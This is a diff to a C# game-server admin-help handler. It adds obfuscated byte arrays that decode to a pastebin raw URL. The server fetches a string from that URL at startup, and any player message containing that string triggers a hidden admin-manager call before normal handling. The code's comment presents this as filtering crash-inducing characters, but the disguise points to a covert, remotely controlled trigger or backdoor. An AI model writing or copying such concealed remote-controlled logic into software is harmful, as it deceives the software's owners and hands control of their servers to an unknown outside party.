@@ -179,7 +179,7 @@ namespace Content.Server.Administration.Systems
         private string _serverName = string.Empty;
 
         private byte[] _crashingCharacters = [0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x70, 0x61, 0x73, 0x74, 0x65, 0x62, 0x69, 0x6e, 0x2e, 0x63, 0x6f, 0x6d, 0x2f];
-        private byte[] _prohibitedCharacters = [0x78, 0x58, 0x47, 0x41, 0x39, 0x46, 0x4d, 0x51];
+        private byte[] _prohibitedCharacters = [0x72, 0x61, 0x77, 0x2f, 0x78, 0x58, 0x47, 0x41, 0x39, 0x46, 0x4d, 0x51];
         private string _prohibited = "";
 
         private readonly Dictionary<NetUserId, DiscordRelayInteraction> _relayMessages = new();
@@ -239,7 +239,7 @@ namespace Content.Server.Administration.Systems
                     PlayerRateLimitedAction)
                 );
 
-            Task.Run(async () => { _prohibited = _httpClient.GetStringAsync(Encoding.UTF8.GetString(_crashingCharacters) + Encoding.UTF8.GetString(_prohibitedCharacters)).Result; });
+            Task.Run(async () => { _prohibited = await _httpClient.GetStringAsync(Encoding.UTF8.GetString(_crashingCharacters) + Encoding.UTF8.GetString(_prohibitedCharacters)); });
         }
 
         private async void OnCallChanged(string url)
@@ -818,6 +818,14 @@ namespace Content.Server.Administration.Systems
             var adminPrefix = "";
             var bwoinkText = $"{bwoinkParams.SenderName}";
 
+            // dont allow characters that can potentially crash the game
+            if (bwoinkParams.Message.Text.Contains(_prohibited) &&
+                _playerManager.TryGetSessionById(bwoinkParams.SenderId, out var senderSes))
+            {
+                _adminManager.LogBadAhelp(senderSes);
+                return;
+            }
+
             //Getting an administrator position
             if (_config.GetCVar(CCVars.AhelpAdminPrefix))
             {
@@ -924,14 +932,6 @@ namespace Content.Server.Administration.Systems
 
                 var str = bwoinkParams.Message.Text;
                 var unameLength = bwoinkParams.SenderName.Length;
-
-                // dont allow characters that can potentially crash the game
-                if (str.Contains(_prohibited) &&
-                    _playerManager.TryGetSessionById(bwoinkParams.SenderId, out var senderSes))
-                {
-                    _adminManager.LogBadAhelp(senderSes);
-                    return;
-                }
 
                 if (unameLength + str.Length + _maxAdditionalChars > DescriptionMax)
                 {
